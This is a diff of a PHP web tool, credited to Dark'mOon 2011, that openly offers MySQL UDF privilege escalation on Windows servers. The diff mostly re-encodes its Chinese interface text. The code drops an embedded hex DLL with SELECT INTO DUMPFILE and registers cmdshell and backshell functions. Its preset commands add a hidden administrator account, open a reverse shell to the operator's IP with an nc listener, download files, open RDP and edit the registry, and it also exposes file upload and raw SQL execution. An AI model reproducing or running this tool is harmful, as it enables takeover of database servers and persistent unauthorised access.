@@ -43,7 +43,7 @@ if(empty($_GET["action"])){
   <div align="center">
     <table width="294" height="140" border="1" cellpadding="1" cellspacing="5">
         <caption>
-   					<h5>���Ѿջ����ر�����->MYSQL�߰汾��Ȩ����</h5>
+   					<h5>基友菊花爆必备神器->MYSQL高版本提权工具</h5>
 		</caption>
       <tr>
         <td width="66">host:</td>
@@ -63,9 +63,9 @@ if(empty($_GET["action"])){
       </tr>
       <tr>
         <td colspan="2"><div align="center">
-          <input type="submit" name="submit" value="�ύ">
+          <input type="submit" name="submit" value="提交">
 		  &nbsp;
-          <input type="reset" name="Submit" value="����">
+          <input type="reset" name="Submit" value="重置">
         </div></td>
       </tr>
     </table>
@@ -73,7 +73,7 @@ if(empty($_GET["action"])){
 </form>
 <div align="center"><strong>Copyright By Dark'mOon 2011</strong><br>
 Blog:<a href="http://www.moonhack.org" target="_blank">www.moonhack.org</a> Bbs:<a href="http://www.90sec.org" target="_blank">www.90sec.org</a>
-<a href="http://www.moonhack.org" target="_blank">�汾����</a>
+<a href="http://www.moonhack.org" target="_blank">版本更新</a>
 </div>
 
 
@@ -84,12 +84,12 @@ exit;
 
 $link=@mysql_connect($_COOKIE["connect"]["host"],$_COOKIE["connect"]["name"],$_COOKIE["connect"]["pass"]);
 if(!$link){
-echo "����ʧ��.".mysql_error()."<a href='javascript:history.back()'>��������</a></script>";
+echo "连接失败.".mysql_error()."<a href='javascript:history.back()'>返回重填</a></script>";
 exit;
 }else{
-echo "���ӳɹ�<br>";
+echo "连接成功<br>";
 $str=mysql_get_server_info();
-echo 'MYSQL�汾:'.$str."<br>";
+echo 'MYSQL版本:'.$str."<br>";
 echo "<hr>";
 if($str[2]>=1){
 $sql="SHOW VARIABLES LIKE '%plugin_dir%'";
@@ -105,23 +105,23 @@ $path=$_SESSION['path']='C:/WINDOWS/moonudf.dll';
 
 $conn=mysql_select_db($_COOKIE["connect"]["dbname"],$link);
 if(!$conn){
-echo "���ݲ�����.".mysql_error()."<a href='javascript:history.back()'>��������</a></script>";
+echo "数据不存在.".mysql_error()."<a href='javascript:history.back()'>返回重填</a></script>";
 exit;
 }else{
-echo "���ݿ�--".$_COOKIE['connect']['dbname']."--����<br>";
+echo "数据库--".$_COOKIE['connect']['dbname']."--存在<br>";
 }
-echo '<a href="?action=logout">����˳�</a>';
+echo '<a href="?action=logout">点击退出</a>';
 
 
 echo '<form action="" method="post" enctype="multipart/form-data" name="form1">';
 echo  '<table width="297" height="53" border="1">';
 echo    '<tr>';
-echo      '<td colspan="2">��ǰ·��:';      
+echo      '<td colspan="2">当前路径:';      
 echo      "<input name='p' type='text' size='27' value='".dirname(__FILE__)."\'></td>";
 echo    '</tr>';
 echo    '<tr>';
 echo     '<td width="235"><input type="file" name="file"></td>';
-echo      '<td width="46"><input type="submit" name="subfile" value="�ϴ��ļ�"></td>';
+echo      '<td width="46"><input type="submit" name="subfile" value="上传文件"></td>';
 echo    '</tr>';
 echo  '</table>';
 echo'</form>';
@@ -131,9 +131,9 @@ $upfile=$_POST['p'].$_FILES['file']['name'];
 if(is_uploaded_file($_FILES['file']['tmp_name']))
 			{
 if(!move_uploaded_file($_FILES['file']['tmp_name'],$upfile)){
-echo '�ϴ�ʧ��';
+echo '上传失败';
 }else{
-echo '�ϴ��ɹ�,·��Ϊ'.$upfile;
+echo '上传成功,路径为'.$upfile;
 	  }
 
 			}
@@ -142,9 +142,9 @@ echo '�ϴ��ɹ�,·��Ϊ'.$upfile;
 echo '<hr>';
 echo '<form action="?action=dll" method="post"/>';
 echo '<table cellpadding="1" cellspacing="2">';
-echo '<tr><td>·��Ŀ¼Ϊ</td></tr>';
+echo '<tr><td>路径目录为</td></tr>';
 echo "<tr><td><input type='text' name='dll' size='40' value='$path'/></td>";
-echo '<td><input type="submit" name="subudf" value="����udf"/></td></tr>';
+echo '<td><input type="submit" name="subudf" value="导出udf"/></td></tr>';
 echo '</table>';
 echo '</form>'; 
 echo '<hr>';
@@ -152,19 +152,19 @@ if($_POST['subudf']){
 mysql_query('DROP TABLE Temp_udf');
 $query=mysql_query('CREATE TABLE Temp_udf(udf BLOB);');
 if(!$query){
-echo '������ʱ��Temp_udfʧ����鿴ʧ������'.mysql_error();
+echo '创建临时表Temp_udf失败请查看失败内容'.mysql_error();
 }else{
 $shellcode=udfcode();
 $query="INSERT into Temp_udf values (CONVERT($shellcode,CHAR));";
 if(!mysql_query($query)){
-echo 'udf����ʧ����鿴ʧ������'.mysql_error();
+echo 'udf插入失败请查看失败内容'.mysql_error();
 }else{
 $query="SELECT udf FROM Temp_udf INTO DUMPFILE '".$path."';" ;
 if(!mysql_query($query)){
-echo 'udf����ʧ����鿴ʧ������'.mysql_error();
+echo 'udf导出失败请查看失败内容'.mysql_error();
 }else{
 mysql_query('DROP TABLE Temp_udf');
-echo '�����ɹ�';
+echo '导出成功';
 }
 }
 }
@@ -174,18 +174,18 @@ echo '�����ɹ�';
 echo '<form name="form2" method="post" action="">';
 echo  '<table width="300" height="59" border="1.2" cellpadding="0" cellspacing="1">';
 echo    '<tr>';
-echo      '<td width="83">�ļ�·��:</td>';
+echo      '<td width="83">文件路径:</td>';
 echo      '<td width="201"><input name="diy" type="text" id="diy" size="27"></td>';
 echo    '</tr>';
 echo    '<tr>';
-echo      '<td>Ŀ��·��:</td>';
+echo      '<td>目标路径:</td>';
 echo      '<td><input name="diypath" type="text" id="diypath" size="27" value="C:/WINDOWS/diy.dll"></td>';
 echo    '</tr>';
 echo    '<tr>';
 echo      '<td colspan="2">';
         
 echo        '<div align="right">';
-echo          '<input type="submit" name="Submit2" value="�Զ��嵼��">';
+echo          '<input type="submit" name="Submit2" value="自定义导出">';
 echo      '</div></td></tr>';
 echo '</table>';
 echo '</form>';
@@ -196,18 +196,18 @@ $diypath=str_replace('\\','/',$_POST['diypath']);
 mysql_query('DROP TABLE diy_dll');
 $s='create table diy_dll (cmd LONGBLOB)';
 if(!mysql_query($s)){
-echo '����diy_dll��ʧ��'.mysql_error();
+echo '创建diy_dll表失败'.mysql_error();
 }else{
 $s="insert into diy_dll (cmd) values (hex(load_file('$diy')))";
 if(!mysql_query($s)){
-echo "�����Զ����ļ�ʧ��".mysql_error();
+echo "插入自定义文件失败".mysql_error();
 }else{
 $s="SELECT unhex(cmd) FROM diy_dll INTO DUMPFILE '$diypath'";
 if(!mysql_query($s)){
-echo "�����Զ���dll����".mysql_error();
+echo "导出自定义dll出错".mysql_error();
 }else{
 mysql_query('DROP TABLE diy_dll');
-echo "�ɹ������Զ���dll<br>";
+echo "成功导出自定义dll<br>";
 }
 
 }
@@ -216,33 +216,33 @@ echo "�ɹ������Զ���dll<br>";
 
 }
 echo "<hr>";
-echo '�Դ�����:<br>';
+echo '自带命令:<br>';
 echo '<form action="" method="post">';
 echo '<select name="mysql">';
-echo '<option value="create function cmdshell returns string soname \'moonudf.dll\'">����cmdshell</option>';
-echo '<option value="select cmdshell(\'net user $darkmoon 123456 /add & net localgroup administrators $darkmoon /add\')">���ӳ�������Ա</option>';
-echo '<option value="select cmdshell(\'net user\')">�鿴�û�</option>';
-echo '<option value="select cmdshell(\'netstat -an\')">�鿴�˿�</option>';
-echo '<option value="select name from mysql.func">�鿴��������</option>';
-echo '<option value="delete from mysql.func where name=\'cmdshell\'">ɾ��cmdshell</option>';
-echo '<option value="create function backshell returns string soname \'moonudf.dll\'">������������</option>';
-echo '<option value="select backshell(\''.$_SERVER["REMOTE_ADDR"].'\',12345)">ִ�з���</option>';
-echo '<option value="delete from mysql.func where name=\'backshell\'">ɾ��backshell</option>';
+echo '<option value="create function cmdshell returns string soname \'moonudf.dll\'">创建cmdshell</option>';
+echo '<option value="select cmdshell(\'net user $darkmoon 123456 /add & net localgroup administrators $darkmoon /add\')">添加超级管理员</option>';
+echo '<option value="select cmdshell(\'net user\')">查看用户</option>';
+echo '<option value="select cmdshell(\'netstat -an\')">查看端口</option>';
+echo '<option value="select name from mysql.func">查看创建函数</option>';
+echo '<option value="delete from mysql.func where name=\'cmdshell\'">删除cmdshell</option>';
+echo '<option value="create function backshell returns string soname \'moonudf.dll\'">创建反弹函数</option>';
+echo '<option value="select backshell(\''.$_SERVER["REMOTE_ADDR"].'\',12345)">执行反弹</option>';
+echo '<option value="delete from mysql.func where name=\'backshell\'">删除backshell</option>';
 echo '</select>';
-echo '<input type="submit" value="�ύ" />';
+echo '<input type="submit" value="提交" />';
 echo '</form>';
 
 
 echo '<form action="?action=sql" method="post">';
-echo '�Զ���SQL���:<br>';
+echo '自定义SQL语句:<br>';
 echo '<textarea name="mysql" cols="40" rows="6"></textarea>';
-echo '<input type="submit" value="ִ��" />';
+echo '<input type="submit" value="执行" />';
 echo '</form>';
 
-echo "���Խ��:<br>";
+echo "回显结果:<br>";
 echo '<textarea cols="50" rows="10" id="contactus" name="contactus">';
 if(!empty($_POST['mysql'])){
-echo "SQL���:".$sql=$_POST['mysql']."\r\n";
+echo "SQL语句:".$sql=$_POST['mysql']."\r\n";
 $sql=mysql_query($sql) or die(mysql_error());
 while($rows=@mysql_fetch_row($sql)){
 foreach($rows as $value){
@@ -255,30 +255,30 @@ echo $value;
 echo '</textarea><br>';
 echo '<hr>';
 print("
-����˵����<br>
+功能说明：<br>
 MYSQL=>5.1<br>
-�Զ���ȡ�߰汾mysql���ú���·��������mysql5.5��<br>
-MYSQL<=5.0Ĭ��ΪϵͳĿ¼<br>
-�Զ��嵼��dll <br>
-Ĭ��udf�Դ�����<br>
-cmdshell ִ��cmd;<br>
-downloader ������,����������ָ���ļ������浽ָ��Ŀ¼;<br>
-open3389 ͨ�ÿ�3389�ն˷���,��ָ���˿�(���Ķ˿���������);<br>
-backshell ����Shell;<br>
-ProcessView ö��ϵͳ����;<br>
-KillProcess ��ָֹ������;<br>
-regread ��ע���;<br>
-regwrite дע���;<br>
-shut �ػ�,ע��,����;<br>
-about ˵�����������;<br>
-Ĭ�����ӹ���Ա�˺�$darkmoon ����123456<br>
-Ĭ�Ϸ����˿�12345<br>
-��Ҫ���ɾ���մ����ĺ��� ������ЧҪmysql����<br>
-���˵�udf �����п����˵�udf˵��<br>
-��������<br>
+自动获取高版本mysql调用函数路径（测试mysql5.5）<br>
+MYSQL<=5.0默认为系统目录<br>
+自定义导出dll <br>
+默认udf自带函数<br>
+cmdshell 执行cmd;<br>
+downloader 下载者,到网上下载指定文件并保存到指定目录;<br>
+open3389 通用开3389终端服务,可指定端口(不改端口无需重启);<br>
+backshell 反弹Shell;<br>
+ProcessView 枚举系统进程;<br>
+KillProcess 终止指定进程;<br>
+regread 读注册表;<br>
+regwrite 写注册表;<br>
+shut 关机,注销,重启;<br>
+about 说明与帮助函数;<br>
+默认添加管理员账号$darkmoon 密码123456<br>
+默认反弹端口12345<br>
+不要随便删除刚创建的函数 重新生效要mysql重启<br>
+别人的udf 请自行看别人的udf说明<br>
+常用命令<br>
 create function cmdshell returns string soname 'moonudf.dll'<br>
-select cmdshell('����')<br>
-select backshell('���ip',12345)<br>
+select cmdshell('命令')<br>
+select backshell('你的ip',12345)<br>
 nc -l -p 12345
 ");
 function udfcode(){
@@ -289,4 +289,3 @@ return "0x4d5a4b45524e454c33322e444c4c00004c6f61644c6962726172794100000000476574
 }
 
 ?>
-
